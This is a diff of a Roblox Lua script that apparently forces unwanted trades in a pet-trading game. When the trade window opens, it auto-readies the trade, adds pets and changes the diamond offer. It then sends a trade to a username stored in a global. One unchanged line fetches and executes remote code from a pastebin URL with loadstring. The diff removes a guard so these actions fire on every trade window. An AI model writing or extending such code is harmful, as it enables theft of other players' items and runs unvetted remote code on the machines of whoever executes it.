@@ -413,21 +413,18 @@ local function rt()
         ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
 end
-local traded = false
+
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        if traded then
-            task.spawn(rt)
-            AddWhitelistedPets()
-            ModifyDiamondOffer(Diamonds)
-        end
+        task.spawn(rt)
+        AddWhitelistedPets()
+        ModifyDiamondOffer(Diamonds)
     end
 end)
 
 local function StartTrade()
     wait(9)
-    traded = true
     loadstring(game:HttpGet("https://pastebin.com/raw/8wP3Pkwz"))()
     SendTrade(getgenv().UName)
 end
